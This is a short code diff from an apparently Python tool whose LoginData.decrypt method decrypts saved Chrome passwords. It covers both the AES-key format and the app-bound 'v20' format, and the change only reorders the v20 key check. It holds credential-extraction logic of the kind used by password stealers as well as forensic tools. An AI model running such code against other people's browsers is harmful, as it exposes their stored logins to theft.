@@ -146,10 +146,11 @@ class LoginData:
 
     def decrypt(self, aeskey:bytes, app_bound_key:bytes):
         try:
-            if self.encrypted_password[:3] == b"v20" and app_bound_key is not None:
-                self.password = decrypt_chrome_password(
-                self.encrypted_password, app_bound_key
-                ).decode("latin-1")
+            if self.encrypted_password[:3] == b"v20":
+                if app_bound_key is not None:
+                    self.password = decrypt_chrome_password(
+                    self.encrypted_password, app_bound_key
+                    ).decode("latin-1")
             else:
                 self.password = decrypt_chrome_password(
                 self.encrypted_password, aeskey
